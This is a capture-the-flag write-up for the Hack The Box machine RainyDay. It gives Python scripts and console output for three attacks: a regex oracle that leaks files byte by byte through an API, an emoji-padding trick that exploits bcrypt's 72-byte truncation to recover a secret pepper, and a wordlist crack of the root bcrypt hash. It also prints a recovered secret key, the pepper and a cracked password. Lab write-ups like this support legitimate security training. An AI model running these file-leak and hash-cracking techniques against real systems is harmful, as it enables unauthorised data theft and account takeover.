# Hack The Box. Machines. RainyDay

Machine write-up: https://7rocky.github.io/en/htb/rainyday

### `extract_file.py`

This script is used to extract the contents of a file using an oracle.

When solving the machine, we have access to `dev.rainycloud.htb` from a container. There is a feature in the API that allows to match a regular expression with a given file.

After using a port forwarding with [`chisel`](https://github.com/jpillora/chisel), we can interact with `dev.rainycloud.htb` (pointing to `127.0.0.1`) and show the oracle (more information in the [write-up](https://7rocky.github.io/en/htb/rainyday)):

```console
$ curl dev.rainycloud.htb/api/healthcheck -d 'file=/etc/hostname&pattern=rainyday&type=CUSTOM' -sH "Cookie: session=$cookie" | jq .result  
true

$ curl dev.rainycloud.htb/api/healthcheck -d 'file=/etc/hostname&pattern=rainydax&type=CUSTOM' -sH "Cookie: session=$cookie" | jq .result
false
```

Notice that `$cookie` is a shell variable with a valid Flask session cookie to interact with the API (more information in the [write-up](https://7rocky.github.io/en/htb/rainyday)).

First of all, we can find the length of the file using binary search:

```
$ curl dev.rainycloud.htb/api/healthcheck -d 'file=/var/www/rainycloud/app.py&pattern=[\s\S]{200,}&type=CUSTOM' -sH "Cookie: session=$cookie" | jq .result
true

$ curl dev.rainycloud.htb/api/healthcheck -d 'file=/var/www/rainycloud/app.py&pattern=[\s\S]{500,}&type=CUSTOM' -sH "Cookie: session=$cookie" | jq .result
true

$ curl dev.rainycloud.htb/api/healthcheck -d 'file=/var/www/rainycloud/app.py&pattern=[\s\S]{5000,}&type=CUSTOM' -sH "Cookie: session=$cookie" | jq .result
true

$ curl dev.rainycloud.htb/api/healthcheck -d 'file=/var/www/rainycloud/app.py&pattern=[\s\S]{10000,}&type=CUSTOM' -sH "Cookie: session=$cookie" | jq .result  
true

$ curl dev.rainycloud.htb/api/healthcheck -d 'file=/var/www/rainycloud/app.py&pattern=[\s\S]{20000,}&type=CUSTOM' -sH "Cookie: session=$cookie" | jq .result
false
```

In Python, we can use this code:

```python
    a, b = 1, 100000

    while a < b - 1:
        m = (a + b) // 2

        if test_pattern('[\s\S]{%d,}' % m):
            a = m
        else:
            b = m

    length = m if test_pattern('[\s\S]{%d,}' % m) else m - 1
    log.success(f'Length: {length}')
```

And  `test_pattern` is just the function that performs the web request to the API:

```python
def test_pattern(pattern: str) -> bool:
    global cookie
    global filename

    r = requests.post('http://dev.rainycloud.htb/api/healthcheck',
        data={'file': filename, 'type': 'CUSTOM', 'pattern': pattern},
        headers={'Cookie': f'session={cookie}'}
    )

    if r.status_code == 500:
        return False

    return r.json().get('result', False)
```

It will return `True` if the pattern matches and `False` in any other case.

Once we have the length of the file, we can start dumping the file byte by byte. For this, I used hexadecimal encoding to avoid issues with URL encoding:

```python
    content = []
    prog = log.progress('Content')

    while len(content) != length:
        for c in ' \n' + string.printable[:-6]:
            if test_pattern(transform(content + [c])):
                content.append(c)
                prog.status(f'{len(content)} / {length}\n\n' + ''.join(content))
                break

    with open(filename[1:].replace('/', '_'), 'w') as f:
        f.write(''.join(content))

    prog.success(f'{len(content)} / {length}\n\n' + ''.join(content))
    log.success(f"File saved as: {filename[1:].replace('/', '_')}")
```

Basically, we are iterating through each character until one of them matches (`test_pattern` returns `True`). Notice the use of `transform` to set the characters in hexadecimal encoding:

```python
def transform(pattern: str) -> str:
    return ''.join(map(lambda c: fr'\x{c.encode().hex()}', pattern))
```

Moreover, the script uses [`pwntools`](https://github.com/Gallopsled/pwntools) to show the progress of the process, as well as the contents of the file, so we don't need to wait until the end to see the file.

Here's a proof of concept:

```console
$ python3 extract_file.py $cookie /var/www/rainycloud/secrets.py
[+] Length: 80
[+] Content: 80 / 80

    SECRET_KEY = 'f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67'  
[+] File saved as: var_www_rainycloud_secrets.py
[*] Elapsed time: 0:02:51
```

### `extract_pepper.py`

This file is used to extract a secret pepper that is appended to an input string before generating a `bcrypt` hash.

The idea is to abuse `bcrypt` limitations to extract the pepper byte by byte. `bcrypt` trunkates the input password to 72 bytes, so if we are able to enter exactly 71 bytes, the 72th byte will be the first byte of the pepper, that way, we can use brute force to get that first character. Then, we can find the second and so on.

However, there is a problem with the size of our input:

```console
jack_adm@rainyday:~$ sudo /opt/hash_system/hash_password.py
Enter Password> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaAAAAAAAAAAAA  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaa
[+] Invalid Input Length! Must be <= 30
```

Fortunately, emoji contain more bytes than characters in Python:

```console
$ python3 -q
>>> len('⚡️')
2
>>> len('⚡️'.encode())  
6
```

So, the idea is to use emoji and other padding characters to reach 71 bytes.

We can use this code:

```python
def extract_pepper(shell):
    pepper = ''

    payload_prog = log.progress('Payload')
    pepper_prog = log.progress('Pepper')

    found = True

    while found:
        found = False

        length_utf8 = (71 - len(pepper)) // 6
        length_ascii = (71 - len(pepper)) - length_utf8 * 6

        payload = '⚡️' * length_utf8 + 'A' * length_ascii
        payload_prog.status(payload)

        shell.sendlineafter(b'$', b'sudo /opt/hash_system/hash_password.py')
        shell.sendlineafter(b'Enter Password> ', payload.encode())
        shell.recvuntil(b'[+] Hash: ')
        password_hash = shell.recvline().strip()

        for c in string.printable:
            pepper_prog.status(pepper + c)

            if bcrypt.checkpw((payload + pepper + c).encode(), password_hash):
                pepper += c
                found = True
                break

    payload_prog.success(payload)
    pepper_prog.success(pepper)
```

Let's see the first iteration:

- We enter this payload (71 bytes): `⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️AAAAA`
- The input password to `bcrypt` is: `⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️AAAAAXXXXXX...`, where `XXXXXX...` is the secret pepper
- But `bcrypt` trunkates to 72 bytes, so the effective input password is `⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️AAAAAX`
- We get a hash for `⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️AAAAAX`
- We iterate through printable characters (`string.printable`), and check if our test password matches the hash

This is the result:

```console
$ python3 extract_pepper.py
[+] Connecting to rainycloud.htb on port 22: Done
[*] jack@rainycloud.htb:
    Distro    Ubuntu 22.04
    OS:       linux
    Arch:     amd64
    Version:  5.15.0
    ASLR:     Enabled
[+] Starting remote process bytearray(b'bash') on rainycloud.htb: pid 73184  
[+] Got shell as `jack_adm`
[+] Payload: ⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️A
[+] Pepper: H34vyR41n
```

Notice that there are other functions to connect via SSH using [`pwntools`](https://github.com/Gallopsled/pwntools) and do a lateral movement from user `jack` to user `jack_adm` as shown in the [write-up](https://7rocky.github.io/en/htb/rainyday).

### `crack.py`

This script is used to crack a `bcrypt` hash for the user `root`. We guess that this hash was generated by the previous tool, so it has a pepper. Knowing this pepper, we can append it to all password from `rockyou.txt` and check if some of them matches the hash.

The code is self-explanatory:

```python
def main():
    if len(sys.argv) != 4:
        print(f'[!] Usage: python3 {sys.argv[0]} <wordlist> <hash> <pepper>')
        exit(1)

    wordlist = sys.argv[1]
    password_hash = sys.argv[2].encode()
    pepper = sys.argv[3].encode()

    with open(wordlist, 'rb') as f:
        passwords = f.read().splitlines()

    for password in passwords:
        if bcrypt.checkpw(password + pepper, password_hash):
            print(f'[+] Password: {password}')
            return
```

And this is the result:

```console
$ python3 crack.py $WORDLISTS/rockyou.txt '$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W' H34vyR41n  
[+] Password: b'246813579'
```
